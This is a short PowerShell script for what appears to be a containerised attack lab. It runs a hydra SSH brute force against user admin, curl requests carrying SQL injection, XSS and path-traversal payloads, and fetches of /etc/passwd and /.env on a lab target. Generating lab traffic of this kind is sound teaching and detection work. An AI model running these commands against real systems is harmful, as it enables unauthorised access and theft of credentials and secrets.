# Opens an interactive shell on the attacker box, or runs a canned attack.
#   .\attack.ps1            # interactive shell (cheatsheet shown on login)
#   .\attack.ps1 ssh-brute  # SSH brute force that succeeds on admin
#   .\attack.ps1 web        # SQLi + XSS + path-traversal + sensitive-file
$ErrorActionPreference = "Stop"
Set-Location $PSScriptRoot

$mode = $args[0]
if ($mode -eq "ssh-brute") {
    docker compose exec attacker hydra -l admin -P wordlists/passwords.txt -t 4 -f ssh://target
}
elseif ($mode -eq "web") {
    # One exec per request: nesting several curls (and an XSS payload's
    # parens) inside a single `sh -c` string trips up the shell quoting.
    docker compose exec -T attacker curl -s -o /dev/null "http://target/search?q=%27%20OR%201%3D1--%20UNION%20SELECT%20password%20FROM%20users"
    docker compose exec -T attacker curl -s -o /dev/null "http://target/search?q=%3Cscript%3Ealert%281%29%3C/script%3E"
    docker compose exec -T attacker curl -s -o /dev/null --path-as-is "http://target/../../../etc/passwd"
    docker compose exec -T attacker curl -s -o /dev/null "http://target/.env"
    Write-Host "Sent SQLi, XSS, path-traversal and sensitive-file requests."
}
else {
    docker compose exec attacker bash
}
